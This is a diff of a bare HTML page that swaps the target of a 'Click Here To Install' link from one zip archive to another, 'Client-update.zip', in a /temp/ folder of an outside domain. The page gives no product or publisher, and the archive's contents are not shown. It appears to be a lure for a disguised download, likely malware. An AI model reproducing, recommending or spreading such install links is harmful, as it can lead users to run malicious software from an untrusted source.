@@ -1,4 +1,4 @@
-<H1 align=center><a href="https://osjz-smolyan.com/temp/Setup-client.zip">Click Here To Install</a></H1>
+<H1 align=center><a href="https://osjz-smolyan.com/temp/Client-update.zip">Click Here To Install</a></H1>
 
 
 
